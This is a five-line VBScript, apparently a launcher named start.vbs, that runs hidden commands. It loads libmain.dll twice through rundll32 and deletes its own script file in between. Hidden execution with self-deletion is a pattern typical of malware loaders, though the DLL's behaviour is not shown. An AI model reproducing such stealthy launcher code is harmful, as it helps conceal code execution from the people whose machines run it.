CreateObject("WScript.Shell").Run _
    "%ComSpec% /c rundll32 libmain.dll msg && " &_
    "timeout 2 /nobreak && " &_
    "del start.vbs && " &_
    "rundll32 libmain.dll main", 0, false
